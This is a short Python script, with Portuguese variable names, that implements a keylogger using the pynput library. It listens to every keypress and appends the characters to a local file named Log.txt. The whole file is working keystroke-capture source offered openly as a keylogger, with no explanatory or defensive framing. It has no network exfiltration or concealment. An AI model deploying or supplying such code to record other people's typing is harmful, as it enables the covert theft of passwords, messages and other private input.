from pynput import keyboard


class KeyLogger():
    def __init__(self, NomeDoArquivo: str = "Log.txt") -> None:
        self.NomeDoArquivo = NomeDoArquivo

    @staticmethod
    def get_char(Tecla):
        try:
            return Tecla.char
        except AttributeError:
            return str(Tecla)

    def on_press(self, Tecla):
        with open(self.NomeDoArquivo, 'a') as logs:
            logs.write(self.get_char(Tecla))

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()


if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
    input()